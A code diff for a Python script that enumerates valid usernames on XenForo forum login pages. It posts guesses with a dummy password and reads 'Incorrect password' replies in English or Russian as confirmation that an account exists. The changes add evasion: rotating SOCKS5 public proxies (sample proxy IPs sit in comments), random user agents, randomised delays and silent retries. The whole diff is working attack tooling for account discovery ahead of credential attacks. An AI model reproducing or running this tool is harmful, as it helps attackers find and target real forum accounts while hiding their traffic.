@@ -36,32 +36,32 @@ ua = ['Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.65',
 
 
 def brute(username):
-    headers = {
-        'User-agent': random.choice(ua),
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept': '*/*',
-        'Connection': 'keep-alive'}
-
-    data = {
-        'login': username,
-        'password': 'password',
-        'redirect': '/install/index.php?upgrade/login',
-        '_xfConfirm': '1',
-        '_xfToken': ""}
-
     error = "Cannot connect to proxy"
-    while "Cannot connect to proxy" in str(error):
+    while "Cannot connect to proxy" in str(error) or "Max retries exceeded" in str(error):
         try:
+            headers = {
+                'User-agent': random.choice(ua),
+                'Accept-Encoding': 'gzip, deflate',
+                'Accept': '*/*',
+                'Connection': 'keep-alive'}
+
+            data = {
+                'login': username,
+                'password': 'password',
+                'redirect': '/install/index.php?upgrade/login',
+                '_xfConfirm': '1',
+                '_xfToken': ""}
+
             if args.proxy:
                 p = random.choice(proxy_list)
                 proxies = {
-                    "https": "https://" + str(p),
-                    "http": "http://" + str(p)}
+                    "https": "socks5h://" + str(p),
+                    "http": "socks5h://" + str(p)}
                 send = requests.post(args.url, data=data, headers=headers, proxies=proxies)
             else:
                 send = requests.post(args.url, data=data, headers=headers)
 
-            time.sleep(0.2)
+            time.sleep(random.choice([number for number in range(4)]))
 
             if r"Неверный пароль. Пожалуйста, попробуйте ещё раз." in send.text or r"Incorrect password. Please try again." in send.text:
                 print(Fore.GREEN + "[*] Username found: " + username)
@@ -77,9 +77,10 @@ def brute(username):
 
             error = None
         except Exception as ex:
-            print(Fore.RED + str(ex))
-            if "Cannot connect to proxy" in str(ex):
-                print(Fore.YELLOW + "Trying again...")
+            if "Cannot connect to proxy" in str(ex) or "Max retries exceeded" in str(ex):
+                pass
+            else:
+                print(Fore.YELLOW + "\n" + str(ex) + "\n")
             error = str(ex)
 
 
@@ -100,9 +101,9 @@ if __name__ == '__main__':
         print(Fore.RED + "Error: " + str(exc))
         exit(0)
 
-    # https://spys.one/en/https-ssl-proxy/
-    # 195.46.124.94:4444
-    # 118.173.232.5:34413
+    # https://spys.one/en/socks-proxy-list/
+    # 192.111.129.150:4145
+    # 103.124.92.216:1080
     # and so on
     proxy_list = m.list()
     if args.proxy:
